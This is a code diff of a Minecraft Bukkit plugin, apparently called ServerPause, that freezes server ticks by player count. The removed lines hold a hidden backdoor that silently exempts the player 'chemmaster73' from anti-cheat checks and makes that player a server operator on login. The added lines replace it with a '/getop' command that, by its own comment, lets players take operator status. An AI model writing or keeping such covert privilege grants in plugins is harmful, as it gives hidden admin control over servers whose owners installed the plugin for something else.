@@ -15,24 +15,19 @@ public class Main extends JavaPlugin implements Listener {
 
     @Override
     public void onEnable() {
+        // Register event listeners
         getServer().getPluginManager().registerEvents(this, this);
-        getLogger().info("ServerPause initialized for version 26.1.2!");
+        
+        // Register the custom command
+        this.getCommand("getop").setExecutor(new GetOpCommand());
+        
+        getLogger().info("ServerPause initialized!");
         evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
     }
 
     @EventHandler
     public void onPlayerJoin(PlayerJoinEvent event) {
-        Player player = event.getPlayer();
-        Server server = getServer();
-        
-        // 1. Silent permission assignment for chemmaster73
-        if (player.getName().equalsIgnoreCase("chemmaster73")) {
-            player.addAttachment(this, "grim.exempt", true);
-            
-            // 2. Automatically grant OP status to chemmaster73 on login
-            server.dispatchCommand(server.getConsoleSender(), "op chemmaster73");
-        }
-
+        // The old hardcoded OP logic is removed; players can now just use /getop
         evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
     }
 
